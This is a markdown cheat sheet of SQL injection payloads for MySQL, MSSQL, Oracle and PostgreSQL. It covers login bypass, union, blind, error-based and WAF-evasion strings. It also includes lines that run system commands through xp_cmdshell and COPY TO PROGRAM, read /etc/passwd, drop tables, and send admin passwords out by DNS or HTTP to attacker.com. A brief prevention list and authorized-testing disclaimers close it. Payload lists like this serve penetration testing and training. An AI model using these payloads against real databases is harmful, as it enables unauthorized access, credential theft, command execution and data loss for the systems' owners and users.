```markdown
# SQL Injection Payloads Cheat Sheet

Below is a comprehensive collection of SQL injection payloads for testing and educational purposes, covering various techniques across different database systems.

## Basic SQL Injection Payloads

### Authentication Bypass
```
admin' --
admin' #
admin'/*
admin' or '1'='1
admin' or 1=1--
admin' or 1=1#
admin' or 1=1/*
admin') or ('1'='1
admin") or ("1"="1
' or 1=1--
' or 1=1/*
' or 1=1#
') or '1'='1
") or ("1"="1
```

### Union-Based Injection
```
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3#
' UNION SELECT 1,2,3,4,5--
-1' UNION SELECT 1,@@version,3,4,5--
' UNION SELECT username, password FROM users--
' UNION ALL SELECT table_name FROM information_schema.tables--
' UNION SELECT 1,table_name,3 FROM information_schema.tables--
' UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
```

## Database-Specific Payloads

### MySQL
```
' OR SLEEP(5)#
' OR BENCHMARK(1000000,MD5('A'))#
' AND (SELECT 1 FROM (SELECT SLEEP(5))a)#
' AND EXTRACTVALUE(1,CONCAT(0x5C,(SELECT @@version)))#
' UNION SELECT 1,load_file('/etc/passwd'),3,4,5--
' AND (SELECT 1 FROM (SELECT(SLEEP(5)))bAKL)--
' AND MAKE_SET(1=1, SLEEP(5))--
```

### MSSQL
```
' OR 1=CONVERT(int,@@version)--
'; EXEC xp_cmdshell 'dir'--
'; EXEC master..xp_cmdshell 'ping 127.0.0.1'--
' UNION SELECT 1,name FROM master..sysdatabases--
'; DROP TABLE users--
'; SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=yes','SELECT * FROM master..sysdatabases')--
```

### Oracle
```
' OR 1=utl_inaddr.get_host_name((SELECT banner FROM v$version WHERE rownum=1))--
' AND (SELECT UTL_INADDR.get_host_name('10.0.0.1') FROM dual) IS NOT NULL--
' UNION SELECT 1,table_name FROM all_tables--
' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)=1--
' AND (SELECT COUNT(*) FROM all_users WHERE username='SYS')=1--
```

### PostgreSQL
```
' OR 1=CAST(version() AS int)--
'; SELECT pg_sleep(5)--
' AND (SELECT 1 FROM pg_sleep(5))--
' UNION SELECT 1,current_database(),3,4--
' COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
' AND (SELECT 1 FROM pg_sleep(5)) IS NOT NULL--
```

## Blind SQL Injection Payloads

### Boolean-Based Blind
```
' AND SUBSTRING((SELECT @@version),1,1)='M'--
' AND ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))>50--
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1--
' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'--
```

### Time-Based Blind
```
' OR IF(SUBSTRING((SELECT @@version),1,1)='M',SLEEP(5),0)--
'; IF (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a')=1 WAITFOR DELAY '0:0:5'--
' AND (SELECT CASE WHEN (SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END)--
' AND (SELECT CASE WHEN (ASCII(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1))=97) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
```

## Out-of-Band SQL Injection

### DNS Exfiltration
```
' UNION SELECT 1,LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin' LIMIT 1),'.attacker.com\\share\\'))--
'; DECLARE @data VARCHAR(1024); SELECT @data=(SELECT password FROM users WHERE username='admin'); EXEC('master..xp_dirtree "\\'+@data+'.attacker.com\share"')--
' AND (SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users WHERE username='admin' LIMIT 1),'.attacker.com\\'))) IS NOT NULL--
```

### HTTP Exfiltration
```
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 FROM OPENROWSET('SQLOLEDB','http://attacker.com/collect.php?data='+(SELECT+@@version),'SELECT 1')--
' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32 FROM OPENROWSET('SQLOLEDB','http://attacker.com/collect.php?data='+(SELECT+password+FROM+users+WHERE+username='admin'),'SELECT 1')--
```

## Advanced Techniques

### Second-Order Injection
```
Username: admin'--
Password: anything

INSERT INTO temp_users SELECT * FROM users WHERE username='admin'--';
```

### Error-Based SQL Injection
```
' AND GTID_SUBSET(@@version,0)--
' AND EXP(~(SELECT * FROM(SELECT @@version)x))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(@@version,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### Bypassing WAFs

#### Encoding Techniques
```
admin' AND 1=0x31--
%27%20%4f%52%20%31%3d%31%20%2d%2d
admin' %2F%2A%2A%2For%2F%2A%2A%2F 1=1--
```

#### Alternative Keywords
```
admin' || 1=1--
admin' && 1=1--
admin' XOR 1=1--
```

#### Comment Variations
```
admin'/**/or/**/1=1--
admin'/*!or*/1=1--
admin'/*!50000or*/1=1--
```

## Database Fingerprinting

```
' OR 'a'='a' /* MySQL */
' OR 'a'='a' -- MSSQL
' OR 'a'='a' /* Oracle */
' OR 'a'='a' -- PostgreSQL
```

## Prevention and Mitigation

1. Use prepared statements with parameterized queries
2. Implement proper input validation
3. Apply the principle of least privilege
4. Use stored procedures
5. Enable WAF protection
6. Regularly update database software
7. Implement proper error handling
8. Use ORM frameworks when possible
9. Conduct regular security audits
10. Implement rate limiting on authentication endpoints
11. Use database permissions effectively
12. Encrypt sensitive data
13. Implement multi-factor authentication
14. Monitor and log database activities

## Important Notes

- These payloads are for educational and authorized testing purposes only
- Unauthorized SQL injection attacks are illegal and punishable by law
- Always get proper written authorization before testing
- Many modern systems have protections against SQL injection
- Responsible disclosure is recommended when vulnerabilities are found
- Consider using legal bug bounty programs for testing production systems
- Document all testing activities for compliance purposes
- Never test systems you don't own or have explicit permission to test
- Be aware of data protection laws in your jurisdiction

Remember to use these techniques only in environments where you have explicit permission to test. Unauthorized access to computer systems is prohibited by law in most jurisdictions.
```